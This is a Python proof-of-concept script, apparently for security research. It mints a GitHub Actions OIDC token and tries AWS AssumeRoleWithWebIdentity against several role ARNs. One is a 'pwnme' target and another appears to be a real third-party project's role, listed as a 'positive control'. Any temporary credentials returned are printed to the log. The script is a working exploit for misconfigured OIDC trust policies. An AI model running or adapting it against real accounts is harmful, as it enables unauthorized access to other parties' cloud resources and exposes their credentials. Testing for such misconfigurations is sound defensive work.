#!/usr/bin/env python3
"""prl-t1 i4168 OIDC proof: mint a GitHub Actions id_token and test sts:AssumeRoleWithWebIdentity.
Roles: pwnme-github-role-100 (target), 000000000000/nope (canary), openvdb-fvdb (positive control)."""
import json, os, base64, urllib.request, urllib.error, urllib.parse

def out(tag, obj):
    print('RESULT %s %s' % (tag, json.dumps(obj, sort_keys=True, default=str)), flush=True)

def mint(aud):
    u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
    if not u or not t: raise RuntimeError('oidc env missing')
    url=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud,safe='')
    req=urllib.request.Request(url, headers={'Authorization':'Bearer '+t,'Accept':'application/json','User-Agent':'prl-t1'})
    return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']

def claims(tok):
    p=tok.split('.')[1]; p+='='*(-len(p)%4)
    d=json.loads(base64.urlsafe_b64decode(p))
    return {k:d.get(k) for k in ('iss','sub','aud','repository','repository_id','ref','event_name','workflow_ref')}

def assume(role, tok):
    print('=== ROLE', role, flush=True)
    data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'prl-t1','WebIdentityToken':tok}).encode()
    try:
        r=urllib.request.urlopen('https://sts.amazonaws.com/',data,timeout=40)
        print('OK', r.status, r.read().decode()[:3000], flush=True)
    except Exception as e:
        body=getattr(e,'read',lambda:b'')().decode()
        print('ERR', e, body[:900], flush=True)

tok=mint('sts.amazonaws.com')
out('CLAIMS', claims(tok))
for role in ('arn:aws:iam::941377144061:role/pwnme-github-role-100',
             'arn:aws:iam::000000000000:role/nope',
             'arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role'):
    assume(role, tok)
out('DONE', {'ok': True})
